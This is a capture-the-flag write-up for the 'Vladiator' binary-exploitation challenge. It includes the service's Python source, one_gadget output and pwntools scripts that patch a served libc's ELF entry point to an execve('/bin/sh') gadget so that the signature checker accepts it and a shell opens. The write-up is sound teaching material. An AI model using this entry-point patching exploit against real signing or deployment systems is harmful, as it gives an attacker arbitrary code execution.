# Write-up of the challenge "Vladiator"

This challenge is part of the **"Binary exploitation"** category and earns 500 points.

# Goal of the challenge

So the goal of the challenge is to give signed binary to the service.

## Program structure

```
#!/usr/bin/python3

from time import sleep

import tempfile
import shutil
import base64
import stat
import os

print("I'll deploy whatever binary you give me")
print("... Just make sure that it's signed, ok?")
sleep(2)

print("I'll give you a signed binary to start of with.")
sleep(1)

with open("/lib/x86_64-linux-gnu/libc.so.6", "rb") as f:
    print("libc:", base64.b64encode(f.read()).decode())

line = input("File (base64): ")

with tempfile.NamedTemporaryFile() as f:

    f.write(base64.b64decode(line))

    os.chmod(f.name, os.stat(f.name).st_mode | stat.S_IEXEC)
    shutil.copy(f.name, f.name + ".elf")

os.system("/home/ctf/ELFSign -c -p /home/ctf/pubkey.pem -e " + f.name + ".elf")

os.remove(f.name + ".elf")
```

## Problem

The problem I had is giving back a signed binary. How can I give back a signed binary, but turns out the service gives back b64 of a signed library. So why not **"b64 decode it**" and make it give back the **"libc.so"**, that's what I did exactly.

## Security breach

The vulnerability is: The server signs any binary you provide without verifying it's the original, unmodified libc it just sent you. This allows you to modify the libc's entry point to a shell spawning gadget and get it signed as legitimate.

## Solution

So after getting back the libc using my custom script:

```
from pwn import *
import base64

p = remote("ssmarkiv.ctfchall.se", 40045)

p.recvuntil(b'libc:')

line = p.recvline()

with open("libc.so", "wb") as f:
  f.write(base64.b64decode(line))



p.close()

```
I decided to do my common routine, I started off by seeing the one_gadget:

```
# ──(venv)(abdullah㉿Abdullah)-[/mnt/d/chals/Pwn/vladiator]
# └─$ one_gadget libc.so
# 0x4f29e execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   address rsp+0x50 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   address rsp+0x50 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

# 0x10a2fc execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv

```

So what I did was write a script that takes the b64 of the signed binary and then decode it to make it libc. After doing that we set it in an array of bytes and change the **"entry point RIP"** which exists att offset **"0x18"** to point to a **"shell (the one_gadget)"**". This website was a help at finding that offset <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">Linkable_Format</a>.

```
from pwn import *
import base64

p = remote('ssmarkiv.ctfchall.se', 40045)

one_gadget = 0x4f2a5

p.recvuntil(b'libc: ')

libc = p.recvline()

byte_array = bytearray(base64.b64decode(libc))

# OVERITE ENTRY WITH ONE_GADGET
byte_array[0x18: 0x18 + 8] = p64(one_gadget)

p.sendline(base64.b64encode(byte_array))


p.interactive()

```

After that, I ran it, spawned a shell and went to the home/ctf and read the flag.txt!

If you liked this writeup you can star my repository.